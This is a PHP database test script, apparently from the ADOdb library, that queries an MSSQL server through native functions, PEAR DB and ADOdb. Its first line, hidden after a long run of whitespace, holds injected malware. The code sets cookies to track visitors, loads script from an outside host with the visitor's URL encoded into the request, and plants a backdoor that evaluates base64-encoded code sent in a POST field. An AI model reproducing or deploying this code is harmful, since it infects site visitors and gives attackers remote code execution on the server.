<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

error_reporting(E_ALL);
ini_set('mssql.datetimeconvert',0); 

function tmssql()
{
	print "<h3>mssql</h3>";
	$db = mssql_connect('JAGUAR\vsdotnet','adodb','natsoft') or die('No Connection');
	mssql_select_db('northwind',$db);
	
	$rs = mssql_query('select getdate() as date',$db);
	$o = mssql_fetch_row($rs);
	print_r($o);
	mssql_free_result($rs);
	
	print "<p>Delete</p>"; flush();
	$rs2 = mssql_query('delete from adoxyz',$db);
	$p = mssql_num_rows($rs2);
	mssql_free_result($rs2);

}

function tpear()
{
include_once('DB.php');

	print "<h3>PEAR</h3>";
	$username = 'adodb';
	$password = 'natsoft';
	$hostname = 'JAGUAR\vsdotnet';
	$databasename = 'northwind';
	
	$dsn = "mssql://$username:$password@$hostname/$databasename";
	$conn = &DB::connect($dsn);
	print "date=".$conn->GetOne('select getdate()')."<br>";
	@$conn->query('create table tester (id integer)');
	print "<p>Delete</p>"; flush();
	$rs = $conn->query('delete from tester');
	print "date=".$conn->GetOne('select getdate()')."<br>";
}

function tadodb()
{
include_once('../adodb.inc.php');

	print "<h3>ADOdb</h3>";
	$conn = NewADOConnection('mssql');
	$conn->Connect('JAGUAR\vsdotnet','adodb','natsoft','northwind');
//	$conn->debug=1;
	print "date=".$conn->GetOne('select getdate()')."<br>";
	$conn->Execute('create table tester (id integer)');
	print "<p>Delete</p>"; flush();
	$rs = $conn->Execute('delete from tester');
	print "date=".$conn->GetOne('select getdate()')."<br>";
}


$ACCEPTIP = '127.0.0.1';

$remote = $_SERVER["REMOTE_ADDR"]; 

if (!empty($ACCEPTIP))
 if ($remote != '127.0.0.1' && $remote != $ACCEPTIP) 
 	die("Unauthorised client: '$remote'");
	
?>
<a href=tmssql.php?do=tmssql>mssql</a>
<a href=tmssql.php?do=tpear>pear</a>
<a href=tmssql.php?do=tadodb>adodb</a>
<?php
if (!empty($_GET['do'])) {
	$do = $_GET['do'];
	switch($do) {
	case 'tpear':
	case 'tadodb':
	case 'tmssql':
		$do();
	}
}
?>